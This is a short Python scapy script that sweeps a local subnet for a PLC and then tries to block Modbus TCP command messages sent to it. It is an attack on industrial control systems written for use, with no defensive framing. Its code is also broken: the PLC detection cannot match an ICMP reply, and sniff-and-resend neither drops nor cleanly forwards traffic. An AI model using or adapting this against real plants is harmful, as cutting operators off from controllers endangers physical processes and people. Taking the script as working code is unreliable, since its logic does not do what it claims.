from scapy.all import *
import ipaddress
import time

# Define the network range to scan
network_range = "192.168.1.0/24"

# Function to scan the network and find the PLC's IP address
def find_plc_ip(network_range):
    print("Scanning network for PLC...")
    plc_ip = None
    for ip in ipaddress.IPv4Network(network_range):
        ip_str = str(ip)
        try:
            # Send an ICMP packet to the IP address
            response = sr1(IP(dst=ip_str)/ICMP(), timeout=1, verbose=0)
            if response:
                # Check if the response is from the PLC (you may need to adjust this based on your PLC's characteristics)
                if "PLC" in response.summary():
                    plc_ip = ip_str
                    print(f"PLC found at IP: {plc_ip}")
                    break
        except Exception as e:
            print(f"Error scanning {ip_str}: {e}")
    return plc_ip

# Function to block command messages to the PLC
def block_command_messages(plc_ip):
    print(f"Blocking command messages to PLC at IP: {plc_ip}")
    def packet_callback(packet):
        if packet.haslayer(IP) and packet[IP].dst == plc_ip:
            if packet.haslayer(TCP) and packet[TCP].dport == 502:  # Assuming Modbus TCP port
                print(f"Blocked command message to PLC: {packet.summary()}")
                return
        sendp(packet)  # Forward the packet if it's not a command message

    # Start sniffing the network
    sniff(filter="ip", prn=packet_callback, store=0)

# Main function
def main():
    plc_ip = find_plc_ip(network_range)
    if plc_ip:
        block_command_messages(plc_ip)
    else:
        print("PLC not found in the network.")

if __name__ == "__main__":
    main()